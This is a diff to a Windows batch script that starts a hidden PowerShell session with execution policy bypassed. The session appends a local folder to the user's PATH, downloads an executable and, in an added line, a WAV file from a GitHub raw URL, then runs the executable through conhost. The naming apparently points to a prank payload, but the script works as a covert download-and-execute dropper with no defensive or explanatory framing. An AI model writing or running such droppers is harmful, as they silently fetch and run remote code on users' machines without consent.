@@ -1,13 +1,16 @@
 @echo off
 
-if not exist "%USERPROFILE%\AppData\Local\TroleitoJaja\PrintH" (
-    mkdir "%USERPROFILE%\AppData\Local\TroleitoJaja"
+if not exist "%LOCALAPPDATA%\TroleitoJaja\PrintH" (
+    mkdir "%LOCALAPPDATA%\TroleitoJaja"
 )
+
 
 powershell -m Hidden -ep Bypass -Command ^
 "$P = '$env:USERPROFILE\AppData\Local\TroleitoJaja'; ^
 [Environment]::SetEnvironmentVariable('PATH', $env:PATH + ';' + $P, [EnvironmentVariableTarget]::User); ^
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lvsix14/Troleito/main/PrintH.exe' -OutFile ($P + '\PrintH.exe')"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lvsix14/Troleito/main/PrintH.exe' -OutFile ($P + '\PrintH.exe'); ^
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lvsix14/Troleito/main/Tololo.wav' -OutFile ($P + '\Trololo.wav')"
+
 
 timeout /t 5 /nobreak >nul
-"$windir$\System32\conhost.exe" printh
+"%windir%\System32\conhost.exe" printh
